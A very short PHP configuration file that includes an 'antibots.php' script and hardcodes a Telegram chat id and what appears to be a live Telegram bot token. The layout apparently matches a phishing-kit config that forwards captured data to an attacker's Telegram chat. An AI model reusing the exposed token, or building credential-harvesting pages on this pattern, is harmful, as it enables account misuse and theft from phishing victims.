<?php
include "antibots.php";
$id="5312195963";
$tokn="6551281962:AAF9UWsjN6DBESRBA2o029UBkgMhtKZ-VlA";
?>